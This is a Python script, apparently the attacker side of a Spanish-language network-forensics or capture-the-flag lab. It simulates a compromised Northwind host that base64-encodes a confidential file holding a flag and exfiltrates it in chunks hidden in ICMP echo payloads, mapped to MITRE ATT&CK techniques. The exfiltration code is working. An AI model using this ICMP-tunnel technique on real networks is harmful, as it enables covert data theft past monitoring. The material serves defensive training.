#!/usr/bin/env python3
"""
Host interno comprometido de Northwind que exfiltra datos por un TUNEL ICMP.

En vez de subir un fichero por HTTP/FTP (que un proxy veria), el atacante trocea
los datos, los codifica en base64 y los saca UNA CONSULTA ICMP echo cada vez,
escondidos en el payload de los ping. El trafico ICMP suele estar permitido y se
inspecciona poco. El sniffer captura los echo requests con datos.

MITRE ATT&CK: T1095 (Non-Application Layer Protocol), T1048.003 (Exfiltration
Over Unencrypted Non-C2 Protocol).

NOTA DE MANTENEDOR: la flag va dentro del fichero exfiltrado y se lee de
/seed/exfil_token.txt. En el repo es un DECOY; el token real se inyecta en CI
desde el secret HEARTBEAT_TOKEN.
"""
import base64
import os
import socket
import time

from scapy.all import IP, ICMP, Raw, send

TARGET = os.environ.get("TARGET", "host")
START_DELAY = int(os.environ.get("START_DELAY", "6"))
TOKEN_FILE = os.environ.get("TOKEN_FILE", "/seed/exfil_token.txt")
ICMP_ID = 0x1337
CHUNK = 24


def log(msg):
    print(msg, flush=True)


def read_token():
    try:
        with open(TOKEN_FILE, "r", encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        return "NORTHWIND{missing_token}"


def main():
    time.sleep(START_DELAY)
    try:
        dst = socket.gethostbyname(TARGET)
    except OSError:
        dst = TARGET
    token = read_token()
    # El fichero confidencial exfiltrado (con la flag).
    secret_file = (
        "Northwind Global Systems - CONFIDENTIAL export\n"
        "classification: RESTRICTED\n"
        f"service_token: {token}\n"
    )
    blob = base64.b64encode(secret_file.encode("utf-8")).decode("ascii")
    chunks = [blob[i:i + CHUNK] for i in range(0, len(blob), CHUNK)]
    log(f"[attacker] exfiltrando {len(secret_file)} bytes en {len(chunks)} "
        f"paquetes ICMP echo hacia {dst} (base64, id=0x{ICMP_ID:x})")
    for i, c in enumerate(chunks):
        pkt = IP(dst=dst) / ICMP(type=8, id=ICMP_ID, seq=i) / Raw(load=c.encode("ascii"))
        send(pkt, verbose=0)
        time.sleep(0.3)
    log("[attacker] exfiltracion completada. Fin.")
    open("/tmp/session_done", "w").close()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
